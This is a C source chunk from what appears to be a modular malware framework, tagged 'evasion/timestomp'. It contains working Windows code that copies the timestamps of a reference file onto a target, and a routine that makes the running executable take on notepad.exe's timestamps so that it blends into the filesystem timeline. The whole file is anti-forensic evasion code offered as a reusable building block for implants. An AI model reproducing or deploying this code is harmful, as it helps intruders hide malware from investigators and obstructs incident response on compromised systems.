// chunk: evasion/timestomp
// depends: (none)
// provides: timestomp_file, timestomp_self
// headers: windows.h
// risk: low
// note: Set file timestamps to match a reference file — blends into filesystem timeline

#ifndef CHUNK_EVASION_TIMESTOMP
#define CHUNK_EVASION_TIMESTOMP

static int timestomp_file(const char *target, const char *reference) {
    HANDLE href = CreateFileA(reference, GENERIC_READ, FILE_SHARE_READ,
                              NULL, OPEN_EXISTING, 0, NULL);
    if (href == INVALID_HANDLE_VALUE) return 0;

    FILETIME ct, at, wt;
    if (!GetFileTime(href, &ct, &at, &wt)) {
        CloseHandle(href);
        return 0;
    }
    CloseHandle(href);

    HANDLE htgt = CreateFileA(target, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ,
                              NULL, OPEN_EXISTING, 0, NULL);
    if (htgt == INVALID_HANDLE_VALUE) return 0;

    int ok = SetFileTime(htgt, &ct, &at, &wt);
    CloseHandle(htgt);
    return ok;
}

static int timestomp_self(void) {
    char self_path[MAX_PATH], sys32[MAX_PATH];
    GetModuleFileNameA(NULL, self_path, MAX_PATH);
    GetSystemDirectoryA(sys32, MAX_PATH);

    char ref[MAX_PATH];
    snprintf(ref, sizeof(ref), "%s\\notepad.exe", sys32);

    return timestomp_file(self_path, ref);
}

#endif
